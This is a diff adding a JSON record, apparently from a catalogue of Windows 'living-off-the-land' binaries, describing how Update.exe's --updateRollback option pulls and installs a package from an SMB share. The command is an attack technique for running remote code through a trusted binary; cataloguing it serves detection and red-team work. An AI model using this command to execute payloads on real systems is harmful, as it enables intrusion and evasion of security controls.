@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-update-exe-execute-4",
+  "name": "LOLBAS · Update.exe (Execute) #4",
+  "command": "Update.exe --updateRollback={PATH_SMB:folder}",
+  "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "update",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Update/",
+  "upstream_id": "Update.exe/Execute/3",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Update.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Update/"
+    }
+  ]
+}
